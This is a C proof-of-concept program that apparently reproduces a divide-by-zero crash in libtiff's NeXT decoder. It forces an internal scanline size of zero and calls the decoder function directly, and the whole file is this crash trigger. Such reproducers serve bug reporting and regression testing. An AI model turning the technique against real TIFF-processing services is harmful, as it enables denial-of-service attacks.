#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <tiffio.h>
#include "tiffiop.h"  // Access internal TIFF struct and decoder function pointer

// Minimal stub I/O callbacks for TIFFClientOpen
static tmsize_t stub_read(thandle_t fd, void *buf, tmsize_t size) {
    (void)fd; (void)buf; (void)size; return 0; // no data
}
static tmsize_t stub_write(thandle_t fd, void *buf, tmsize_t size) {
    (void)fd; (void)buf; return size; // pretend we wrote everything
}
static toff_t stub_seek(thandle_t fd, toff_t off, int whence) {
    (void)fd; (void)whence; return off; // return requested offset
}
static int stub_close(thandle_t fd) {
    (void)fd; return 0;
}
static toff_t stub_size(thandle_t fd) {
    (void)fd; return 0; // empty file
}
static int stub_map(thandle_t fd, void **base, toff_t *size) {
    (void)fd; (void)base; (void)size; return 0; // mapping not supported
}
static void stub_unmap(thandle_t fd, void *base, toff_t size) {
    (void)fd; (void)base; (void)size; // no-op
}

int main(void) {
    // Create a dummy TIFF handle in read mode using client I/O stubs
    TIFF *tif = TIFFClientOpen("mem", "r", (thandle_t)0,
                               stub_read, stub_write, stub_seek,
                               stub_close, stub_size, stub_map, stub_unmap);
    if (!tif) {
        fprintf(stderr, "Failed to create TIFF handle\n");
        return 1;
    }

    // Install the NeXT decoder via the public API
    if (!TIFFSetField(tif, TIFFTAG_COMPRESSION, COMPRESSION_NEXT)) {
        fprintf(stderr, "Failed to set COMPRESSION_NEXT (codec may be unavailable)\n");
        TIFFClose(tif);
        return 1;
    }

    // Ensure the decoder function pointer is set
    if (tif->tif_decoderow == NULL) {
        fprintf(stderr, "Decoder function pointer not set\n");
        TIFFClose(tif);
        return 1;
    }

    // Craft internal state to hit the vulnerable code path:
    // Set scanline size to 0 (as can happen after an internal overflow/clamp)
    tif->tif_scanlinesize = 0;

    // Raw compressed buffer is irrelevant for triggering the modulo, so leave empty
    tif->tif_rawcp = NULL;
    tif->tif_rawcc = 0;

    // Output buffer; "occ" passed as 0. NeXTDecode will evaluate (occ % scanline)
    // which becomes (0 % 0) and triggers a divide-by-zero before further checks
    uint8_t outbuf[1] = {0};

    // Call the decoder directly to trigger the bug
    // Signature: int (*tif_decoderow)(TIFF*, uint8_t*, tmsize_t, uint16)
    // The last parameter (s) is unused by NeXTDecode
    int ret = tif->tif_decoderow(tif, outbuf, 0, 0);

    // If the divide-by-zero didn't abort, print result (unexpected)
    printf("Decoder returned: %d (unexpected, bug may not have triggered)\n", ret);

    TIFFClose(tif);
    return 0;
}
